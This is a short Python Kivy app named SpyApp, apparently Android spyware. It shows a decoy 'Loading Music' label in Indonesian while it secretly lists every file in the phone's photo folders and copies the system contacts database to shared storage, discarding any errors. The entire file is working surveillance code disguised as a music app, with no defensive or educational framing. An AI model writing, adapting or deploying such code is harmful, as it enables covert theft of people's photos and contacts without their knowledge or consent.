from kivy.app import App
from kivy.uix.label import Label
import os

class SpyApp(App):
    def build(self):
        self.dump_gallery()
        self.dump_contacts()
        return Label(text="Memuat Musik... 🎵")

    def dump_gallery(self):
        # Akses galeri (biasanya di /sdcard/DCIM atau /sdcard/Pictures)
        paths = ["/sdcard/DCIM", "/sdcard/Pictures"]
        with open("/sdcard/gallery_list.txt", "w") as f:
            for path in paths:
                for root, dirs, files in os.walk(path):
                    for name in files:
                        f.write(os.path.join(root, name) + "\n")

    def dump_contacts(self):
        try:
            contacts_path = "/data/data/com.android.providers.contacts/databases/contacts2.db"
            os.system(f"cp {contacts_path} /sdcard/contacts_backup.db")
        except:
            pass

if __name__ == '__main__':
    SpyApp().run()
